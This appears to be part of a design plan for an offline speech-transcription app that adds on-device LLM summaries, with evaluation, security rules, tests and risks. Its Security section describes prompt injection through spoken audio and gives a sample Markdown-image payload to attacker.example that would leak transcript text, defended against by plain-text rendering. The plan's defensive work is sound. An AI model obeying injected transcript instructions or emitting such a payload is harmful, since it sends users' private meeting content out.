- **Results last for the session only, on purpose.** `result`, `result_stem`, `summary`, `board` and `_board_key` (and the transcript's KV cache, if Performance item 3 ships) live in `st.session_state` and are lost on a browser refresh. That matches the transcript's behaviour and the app's design of keeping no user data on disk. Say so in CLAUDE.md's UI Layout section so it reads as a decision, not an omission.
- **Edited questions reset** to `DEFAULT_QUESTIONS` in each new session, because the `st.text_area` value lives only in session state. That's accepted for v1. Keeping custom questions between sessions (a question file to download and upload, or saving to a local file) is out of scope, because it would be the first user data the app writes to disk.
- **The only exports** are the download buttons: the transcript, plus the analysis if Phase 1 decides to ship it.

## Evaluation

Tests show the code is **correct**: the cache matches a full run, the JSON parses, probabilities fall in [0, 1]. The evaluation measures whether the analysis is **any good**. It runs locally on real weights and never in CI.

### Data

- **The AMI Meeting Corpus** (English meetings, CC BY 4.0). Its human annotations include abstractive summaries with **decisions** and **action items**, which line up with the summary card's action items and with the board's "making a decision?" and "commit to doing something?" questions. Before relying on it, check the licence and the annotation format at the source. If AMI doesn't fit, any English corpus with human transcripts and meeting-level labels will do; the design below doesn't depend on AMI specifically.
- **About 20 excerpts**, each a few minutes long. Label each with the 9 `DEFAULT_QUESTIONS` (Yes/No), using the corpus annotations where they answer a question and checking by hand where they don't. That's about 180 labels.
- **Split in two:** tune the prompt on one half (about 90 labels), report scores only on the other. Fix the split once, by excerpt (never splitting one excerpt's questions across halves), and commit it.
- **Run each excerpt twice:** once on the corpus's **human transcript**, once on **TurboCTC's output** through the app's own path (`load_and_preprocess_audio` → VAD → `run_pipeline`). The difference between the two is the cost of speech errors, which separates "the speech model misheard" from "the LLM misread". The plan's Risks section raises this (`shapeare`, `libvox`) but nothing else measures it.

### Metrics

- **Yes/no board:**
  - **ROC-AUC per question and overall.** It measures exactly what the UI promises, a ranking: does a true "yes" score above a "no"?
  - **Brier score and a reliability table** (about 5 bins). This is what would ever justify showing P(yes) as a probability, or a 0.5 verdict.
  - **Yes+No mass:** its distribution, which sets the diagnostic threshold in Phase 2.
- **Summary card:**
  - **Action-item recall** against the corpus's action items, matched by hand: what fraction the card lists.
  - **A manual rubric** on about 10 summaries per model: faithful (no invented facts), complete (main topic and decisions present), and whether misheard words were repeated. Score each 0–2 and keep the reviewer's notes.
  - No LLM judge from a cloud service: the app is offline by design, and so is its evaluation.
- **Speed:** the script also records prefill tokens/s and total analysis time with every run, as a regression check (Performance, item 8). The budgets themselves are measured in Phase 0 (steps 2, 6 and 9).

### Running it

- An `evals/` package, run by hand from the repo root: `uv run python -m evals.run_analysis_eval` (with an `evals/__init__.py`). It writes a results table (held-out scores, per model, human vs ASR transcript) to standard output and a dated JSON file.
  - **Run it as a module, not a path.** `python evals/run_analysis_eval.py` puts `evals/`, not the repo root, on Python's import path, so `from streamlit_app import ...` fails. The `pythonpath = ["."]` setting in `pyproject.toml` applies to pytest only.
  - **CI and the Stop hook check it.** `ruff check .` and `ty check` cover the whole repo on both Python versions, so the script may import only the standard library and packages already in `uv.lock`. Compute ROC-AUC, Brier and the reliability table by hand (each is a few lines) rather than adding scikit-learn. If a corpus parser is ever needed, add it to a separate `[dependency-groups] eval` group, never to the app's dependencies.
  - Don't name any file in `evals/` `test_*.py`, or pytest would collect it and try to load real weights in CI.
- **Commit:** the labels, the split and the script. **Never commit:** the corpus audio and transcripts, or the results JSON. Put the data under `evals/data/` and add `evals/data/` and `evals/results/` to `.gitignore` in the same commit as the script. The existing weights guard doesn't cover audio.
- Re-run it whenever the prompt wording, `LLM_ID`/`LLM_REVISION`, the chat template, or `MODEL_REVISION` (the speech model, which changes the ASR transcripts) changes. Compare against the recorded scores before committing.
- Record the held-out scores in CLAUDE.md, in the same style as the TurboCTC WER series, with the date, model, revision and number of labels.

## Security

The app's promise is that nothing leaves the machine. That has two halves: no data **out**, which the offline design covers, and no access **in**, which it didn't until 2026-10-17. Its other protection is that every model is pinned to an exact revision.

### Already in place

- **Offline:** no cloud APIs (Deepgram rejected); the evaluation uses no cloud LLM judge either.
- **Local-only server** (`config.toml`, added 2026-10-17): `server.address = "localhost"` and `browser.gatherUsageStats = false`. Verified: the server listens on `127.0.0.1:8599` only, and the LAN address refuses connections (CLAUDE.md, Configuration). Keep both keys. A future "use it from my phone" feature would undo the first, so it needs its own plan.
- **Pinned revisions** for `MODEL_ID` and `MLX_VAD_REPO` today, as full commit hashes, and for `LLM_ID` from B5 (`test_llm_revision_is_pinned`). They were added for reproducibility, and they're also what vouches for the code-like files in those repos (see below).
- **Strict loading and safetensors:** a missing weight fails loudly, and safetensors can't run code on load, unlike pickle. (The PyTorch VAD fallback's `.jit` file comes from the pinned `silero-vad` package.)
- **Locked dependencies:** `uv.lock` records exact versions and file hashes, and CI installs with `uv sync --locked`.
- **Nothing on disk** (see Storage), and `.gitignore` keeps weights and `.env` files out of git.

### New rules for this plan

1. **Model output is shown as plain text, never Markdown** (Phase 1, Card). Words spoken in a recording become transcript, and the transcript goes into the prompt. So audio can carry instructions to the LLM. The dangerous result isn't a wrong summary but a Markdown image: `![](https://attacker.example/x?d=<transcript>)` makes the browser fetch that URL, sending transcript text out of an offline app without a click. A link would also become clickable phishing. Plain text makes both impossible, which is simpler and safer than trying to detect injected instructions.
   - The same rule covers the `<stem>_analysis.md` download, if it ships: escape generated text there, because the file will be opened in a Markdown viewer.
   - Keeping the transcript in the user turn behind a delimiter stays as well, but it's a weak control on its own.
2. **No code from model repos runs.** `mlx_lm.load` keeps `trust_remote_code=False` (its default); never pass `True`. The TurboCTC repo ships `.py` files (`modeling_ctc_conformer.py` and others) that `mlx_audio` doesn't run. The chat template is code that does run, inside `transformers`' Jinja sandbox, and the pinned `LLM_REVISION` is the only thing vouching for its contents. Changing that revision means reading the template diff.
3. **Model output is data, never code.** Parse it with `json.loads` only: never `eval`, `exec`, `ast.literal_eval` on model text, or YAML. Validate the keys and types, as Phase 1 already says.
4. **No transcript text in logs or warnings.** The Yes+No mass warning and the prefix-mismatch `RuntimeWarning` give numbers and question indexes only. A terminal scrollback or a pasted log shouldn't contain meeting content.
5. **Review new dependencies** (Step 0, item 4). The same review applies when `mlx-lm` is added: list what it brings into `uv.lock` (`sentencepiece`, `protobuf`, `pyyaml`, `jinja2`, per the Model section) and check anything new.
6. **Untrusted media goes into FFmpeg.** Every upload is parsed by the FFmpeg bundled in PyAV, which is C code with a history of memory-safety bugs. The protections are to keep `av` current (Step 0's 18 → 19 upgrade counts as a security update), the local-only server, and the 500 MB `maxUploadSize`. Never add a "load from URL" input without its own plan.
7. **A future database file** (Out of scope, persistence) is created readable only by you (`0600`) and holds text only.

### Tests

- **Plain-text rendering:** an AppTest with a stubbed analysis whose summary, topic, topics and action items contain `![x](http://example.invalid/i)` and `[x](http://example.invalid/l)`. Assert that each appears as literal text in an `st.text` element, and that no markdown element in the Analysis card contains `](`.
- **`trust_remote_code` default:** extend the contract tests to assert that `mlx_lm.load`'s `trust_remote_code` parameter defaults to `False`, and a `TestLoadLlm` case that it's never passed.
- **Config:** extend the config tests to assert `server.address == "localhost"` and `browser.gatherUsageStats is False`, so a config edit can't silently reopen the server to the network.
- **No transcript in warnings:** in the prefix-mismatch fallback test, assert that the warning message doesn't contain the transcript text.

## Tests

Follow the existing conventions (CLAUDE.md, Tests section):

- **`test_streamlit_app.py`:** pure helpers are parametrized functions, stateful code goes in `Test*` classes, and `st` is mocked wholesale.
- **`test_app_ui.py`:** AppTest patches the **shared upstream import**, not `streamlit_app.*`.

### Unit

- `test_llm_revision_is_pinned`: a full 40-hex hash, like `test_model_revision_is_pinned`.
- JSON parsing: valid JSON; JSON inside a code fence; JSON with stray prose around it; missing keys and wrong types (raise); one retry then `RuntimeError`.
- Yes/no normalisation from fake logits: equal logits give 0.5; a large Yes margin gives ≈ 1. Only the two ids matter, so other vocab entries must not change the result.
- Prefix-mismatch fallback: a fake tokenizer whose template changes the prefix gives the full-prompt path plus a `RuntimeWarning`.
- `MAX_ANALYSIS_TOKENS` refusal gives a `RuntimeError` with the token count in the message.
- Disk-full load: a `load_llm` whose loader raises the Phase 0 step 8 exception gives the one-line `RuntimeError`.
- Offline first use: a loader raising the Hub-unreachable exception (Phase 0 step 8) gives the one-line "isn't downloaded yet" `RuntimeError`.
- End of turn: a fake model whose tokens include an EOS id after valid JSON stops there, and the parsed summary has no trailing text. A fake that never emits EOS hits `max_tokens` and raises the "cut off" `RuntimeError` **without** retrying (count the calls).
- Trim uses `offset`: after summary generation the cache's `offset` equals `len(prefix_ids)`, including when the generator ran one step ahead.
- Question cleaning (parametrized): blank lines and duplicates removed; lines over 200 characters dropped; a line containing `<|im_end|>` dropped; everything dropped leaves an empty list.
- Length pre-check: a transcript whose word estimate is far over the limit raises before `load_llm` is called (assert the loader was never called).
- If the analysis download ships: the Markdown formatter, from a fixed `Summary` and board to the exact expected text, including a field containing Markdown characters that must come out escaped (Security, rule 1).
- `TestRunPipeline`: the new `segments` key, and an exact key-set update.
- `TestLoadLlm` decorated with `@patch("streamlit_app.st", new=MagicMock(spec=[]))`, the same guard `TestLoadModel` uses.

### Contract (real installed `mlx_lm`, no download)

- `mlx_lm.load` has a named `revision` parameter.
- `mlx_lm.utils.load_model`'s `strict` parameter defaults to `True`. That's the only thing standing between a renamed key and randomly initialised layers, since `load()` doesn't expose it.
- `mlx_lm.models.granite` imports, and `make_prompt_cache`/`trim_prompt_cache`/`can_trim_prompt_cache` exist.
- **Cache-equivalence test with a tiny random Granite model,** like `TestMlxVadInternals`:
  - Build `mlx_lm.models.granite.Model(ModelArgs(...))` with 2 layers and a small hidden size: no weights to download, but the real classes.
  - Assert (a) cached prefix plus suffix logits ≈ full-prompt logits, and (b) after trimming question A, question B's logits match a fresh cache.
  - Drop the trim and (b) fails. That's the point: it's the only CI coverage of the cache logic.

### Real weights

`test_analyses_a_transcript_with_real_weights`:

- Gated on `huggingface_hub.try_to_load_from_cache(LLM_ID, "model.safetensors", revision=LLM_REVISION)`, exactly as the TurboCTC smoke test is gated, so CI never fetches 3.89 GB.
- Assert only structure: valid keys, a non-empty summary, probabilities in [0, 1]. Plus one strong semantic signal, e.g. a transcript that clearly says "the meeting is on friday at three" gets P(yes) > 0.5 on the date/time question.
- Don't pin exact wording, for the same reason the TurboCTC test doesn't.

### AppTest

- Patch `mlx_lm.load` to return a spec'd fake `(model, tokenizer)`.
- Analysis off (default): no LLM load and no Analysis card. The existing tests pass, apart from the three toggle and markdown counts updated on purpose (Phase 1, Sidebar).
- Slot shape: after a run, `transcript_slot`'s children are `empty` (feedback) at index 0, `empty` (analysis slot) at index 1 and the transcript card at index 2, **with analysis on and with it off**.
- Blank transcript: a stubbed speech model returning `""` with analysis on shows "No speech to analyse." and never calls `mlx_lm.load`.
- Zero questions: clearing the questions box and analysing shows "Add at least one question to score." and no board.
- Questions survive the toggle: edit the questions, toggle analysis off and on, and the text area still holds the edited text (`persist_state="session"`).
- Errors stay in the analysis slot: a `load` that raises `OSError` (offline) shows the one-line error in the analysis slot, the transcript card is present, and the "Transcription complete" toast fired. Repeat with a `ValueError` from the model, which must show `st.exception` in the analysis slot, not in place of the transcript.
- Download notice: with analysis on and `try_to_load_from_cache` patched to return `None`, the "about 4 GB" caption is shown; patched to a path, it isn't.
- **Not testable with AppTest** (manual checks after B7): the skeleton's height and appearance (AppTest sees only each run's final state, and has no skeleton accessor), Reduce Motion, and keyboard order. These belong to the Accessibility verification, not to the test suite.
- Analysis on: one Analysis card in the transcript column **above** the transcript card (assert the order: Analysis card, then transcript card, after the `feedback` placeholder), the board present, and `load` called once with `revision=LLM_REVISION`.
- An analysis failure keeps the transcript card plus an error inside the analysis area, and `result` stays in session state.
- Toggling analysis on after a run shows "Analyse" and does **not** re-transcribe: the speech model's `generate` call count is unchanged.
- Editing questions after an analysis invalidates `board` but neither `summary` nor `result` (see Performance, Tests).

## Docs and housekeeping

- **CLAUDE.md:**
  - Dependencies: `mlx-lm` is back, and why, with the version floor once chosen. Revise the "`mlx-lm` is no longer imported anywhere" passages, including the note that `_supports_mlx_vad` is the only probe over library internals, if Phase 2 relies on cache internals.
  - Models: the new entry.
  - Architecture: the new functions.
  - UI Layout: the analysis toggle, questions expander and Analysis card.
  - Languages: Phase 0's memory and speed figures and `MAX_ANALYSIS_TOKENS`.
  - Tests.
  - The Project Overview currently says "Transcription only", which becomes untrue.
- **README.md:** the feature, its memory cost and the first-use download, plus **how to remove the model** if analysis is no longer wanted: `uv run hf cache rm model/<LLM_ID> --dry-run`, then without `--dry-run`. This frees about 5 GB; the dry run's size total may overstate it (see Storage).
- **GitHub repo details, once the feature has shipped (not before):**
  - Add the topics `mlx-lm`, `llm` and `summarization`: `gh repo edit --add-topic mlx-lm,llm,summarization`. That makes 18, under GitHub's limit of 20.
  - Extend the description, e.g. "…, with on-device summaries and yes/no questions from Granite 4.2." Keep `pyproject.toml`'s `description` and README.md's opening line identical to it.
  - The 2026-10-17 baseline is 15 topics, with `translation` removed because TurboCTC has none. The description is "Offline English speech-to-text on Apple Silicon: IBM Granite Speech 5.0 TurboCTC on MLX, with Silero VAD timestamps, in a Streamlit app."
- **Markdown fences:** `ruff format --check .` formats ```python fences in `.md` files (ruff ≥ 0.16.0, per CLAUDE.md), and **this file is checked too while it sits at the repo root.** That's why it has no Python fences. Keep it that way, or format any you add.
- **Commits** (conventional, with scopes; see CLAUDE.md Git):
  - `fix(ui): serve on localhost only and disable usage stats` (A1)
  - `chore: ignore model weights and local env files` (A2)
  - `docs: reword project description` (A3)
  - `fix(ui): keep the accepted formats readable at laptop widths` (A4; Layout across displays, change 5)
  - `chore(deps): upgrade locked dependencies` (A5; Step 0)
  - `feat(ui): cap the layout width on large displays` (A6; Layout across displays, change 1)
  - `chore(deps): add mlx-lm for transcript analysis`
  - `test(pipeline): add transcript analysis evaluation` (the `evals/` script, labels, split and `.gitignore` entries, built during Phase 0)
  - `feat(pipeline): summarise transcripts with granite 4.2 3b`
  - `feat(pipeline): answer yes/no questions from cached transcript prefill`
  - `feat(ui): add transcript analysis card and questions`
  - `docs: document transcript analysis`
  - Commit when asked; the user pushes (no `git push`).
- **Releases:** don't bump `version` as part of this; the bump is the release action and is the user's call.

## Out of scope (decided in the planning session)

- **Deepgram API:** a cloud service and a key, which breaks the app's offline design.
- **Granite Switch** (`granite-switch-4.1-{8b,30b}`): no MLX build exists, and its Transformers/vLLM checkpoint won't fit in 16 GB anyway. Its `decision` adapter is what the plain instruct model only approximates here.
- **Guardian safety check:** Granite 4.2 has no Guardian adapter, and a separate `granite-guardian-4.1-8b` (about 5 GB at 4-bit) won't fit next to the 8B model. Questions like "Does the speaker use profanity?" on the board are the cheap approximation.
- **Live mic streaming** (the Space's re-transcribe-every-0.5 s loop): a different product, and a poor fit for Streamlit's rerun model.
- **Restoring casing and punctuation:** a plausible later use of the same LLM, but a separate feature.
- **Chunked summaries for transcripts over the token limit.**
- **Keeping results or custom questions between sessions, and so any database.** Anything kept would be the first user data the app writes to disk (see Storage). Nothing in Phases 0–3 needs data to outlive the session, so v1 has no database. Recorded here so a later plan doesn't start from scratch:
  - **When it would earn its place:** a history of past transcripts and analyses, saved question sets, or search across past transcripts.
  - **Use SQLite through the stdlib `sqlite3`.** It's one local file with no server, works offline and adds no dependency (the lock doesn't change). Its FTS5 full-text search suits the lowercase, unpunctuated transcripts. Deleting everything means deleting one file.
  - **Rejected:**
    - PostgreSQL or MySQL: a server for one user on one machine.
    - DuckDB: built for analytical queries, while the workload would be small writes, one result at a time.
    - A standalone vector database (Chroma, LanceDB): only needed for semantic search, and if that's ever wanted, the `sqlite-vec` extension adds it to the same file, with `granite-embedding-english-r2` producing the vectors.
    - Streamlit's `st.connection("sql")`: it adds SQLAlchemy to wrap what `sqlite3` already does.
  - **To settle before building it:**
    - It's opt-in and off by default: a sidebar toggle that says where the file lives.
    - The file goes in a per-user data directory (e.g. `~/Library/Application Support/granite-speech-intelligence/`), never the repo, so a transcript can't be committed by accident. As a second guard, add `*.db`, `*.sqlite3`, `*-wal` and `*-shm` (SQLite's side files) to `.gitignore` in the same commit as the feature.
    - It stores text and results only, never audio.
    - There's a delete control in the UI.
    - CLAUDE.md's statements that nothing is written to disk get revised.
- **An MLX-only stack** (dropping `torch` and `torchaudio`). The models already run on MLX. Torch handles the waveform type, the downmix, the resample and the VAD fallback, all on the CPU and all taking milliseconds, so removing it gains no speed. It's a separate effort, not a phase of this one, so that a changed transcript has one cause rather than two. What it would gain: a smaller install, fewer dependency conflicts (the `silero-vad` pin exists because of torch/torchaudio), and torch's resident memory (Phase 0 step 7 measures it). What it would cost:
  - **Offline-first VAD.** The `silero-vad` package ships its model weights inside the install, so the PyTorch fallback works on a first run with no network, while the MLX VAD downloads from the Hub. Removing torch means either losing that, or bundling the 1.2 MB MLX VAD weights (`MLX_VAD_REPO` at `MLX_VAD_REVISION`) in the repo, which is a decision in its own right.
  - **The cross-backend check.** `test_both_backends_agree_on_real_audio` would have nothing to compare against.
  - **The non-16 kHz VAD route.** The app always resamples to 16 kHz before VAD, so this is only a guard, but it goes too.
  - **Many signatures to change.** `torch.Tensor` appears in about ten of them, and would become NumPy or MLX arrays.

  **First step if it's ever taken up, and worth doing on its own merits:** resample inside `_decode_audio` with PyAV's `AudioResampler`, straight to `SAMPLE_RATE` mono. That removes `torchaudio` entirely, and it lowers peak memory because the full decode at the source rate and channel count is never held (CLAUDE.md puts a 48 kHz stereo hour at about 1.4 GB float32). But FFmpeg's resampler filter differs from torchaudio's, so the waveform won't be identical. Before it ships, re-run the LibriSpeech dev-clean WER set (whole-utterance baseline 6.17%) and check the VAD spans on the fixtures. Commit it separately, as `perf(pipeline): resample in the decoder`.

## Risks and open questions

- **Calibration:** P(yes) from a base instruct model is a ranking, not a probability you can rely on. The evaluation measures how far off it is (Brier score and reliability table on about 90 held-out labels). Until those numbers say otherwise, the UI must not present it as a verdict.
- **ASR errors carry through:** e.g. the fixture's `shapeare` and `libvox`. The prompt warns the model; the summary may still repeat misheard words.
- **Memory at the edge of 16 GB:** both models stay cached after a run. If Phase 0 shows pressure, consider clearing the speech model's cached resource before analysis. But that costs a reload on the next Transcribe; measure before choosing.
- **The model loads on first use:** the first analysis on a cold cache is a 3.89 GB download. The toggle's help text and the `show_time` spinner must make that visible.
- **Prompt injection through audio:** see Security, rule 1. Showing output as plain text removes the way data could leak out; a manipulated summary is still possible, which is one more reason the card doesn't present itself as authoritative.
- **Template drift:** a future revision of the chat template could change the `<think></think>` suffix or the prefix layout. The prefix-equality assertion and the Yes+No mass warning are the tripwires; the revision pin is what keeps them quiet.
